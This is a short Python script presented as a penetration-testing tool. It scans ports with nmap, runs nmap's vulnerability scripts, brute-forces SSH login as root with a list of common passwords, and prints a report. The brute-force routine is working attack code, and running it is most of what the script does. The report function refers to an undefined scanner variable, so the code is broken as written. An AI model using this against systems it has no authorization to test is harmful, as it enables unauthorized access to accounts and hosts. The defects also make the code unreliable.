import nmap
import requests
import paramiko
from paramiko import SSHClient, AutoAddPolicy

def network_scan(target):
    nm = nmap.PortScanner()
    nm.scan(target, '1-1024')
    scan_data = nm.all_hosts()
    return scan_data

def vulnerability_scan(target):
    nm = nmap.PortScanner()
    args = '-sV --script=vuln'
    nm.scan(target, arguments=args)
    vuln_data = nm[target]['hostscript']
    return vuln_data

def ssh_brute_force(target, username, password_list):
    ssh = SSHClient()
    ssh.set_missing_host_key_policy(AutoAddPolicy())
    for password in password_list:
        try:
            ssh.connect(target, username=username, password=password)
            return password
        except paramiko.AuthenticationException:
            continue
    return None

def report_scan_results(scan_data, vuln_data, ssh_password):
    report = "Penetration Testing Report\n\nNetwork Scan Results:\n"
    for host in scan_data:
        report += f"Host: {host}\n"
        for proto in nm[host].all_protocols():
            lport = nm[host][proto].keys()
            for port in lport:
                report += f"Port: {port}, State: {nm[host][proto][port]['state']}\n"

    report += "\nVulnerability Scan Results:\n"
    for item in vuln_data:
        report += f"ID: {item['id']}, Description: {item['output']}\n"

    if ssh_password:
        report += f"\nSSH Brute Force Result:\nPassword found: {ssh_password}\n"
    else:
        report += "\nSSH Brute Force Result:\nPassword not found\n"

    return report

# Example usage
target = '192.168.1.1'
username = 'root'
password_list = ['password123', 'admin', 'root', 'toor']

scan_data = network_scan(target)
vuln_data = vulnerability_scan(target)
ssh_password = ssh_brute_force(target, username, password_list)
report = report_scan_results(scan_data, vuln_data, ssh_password)

print(report)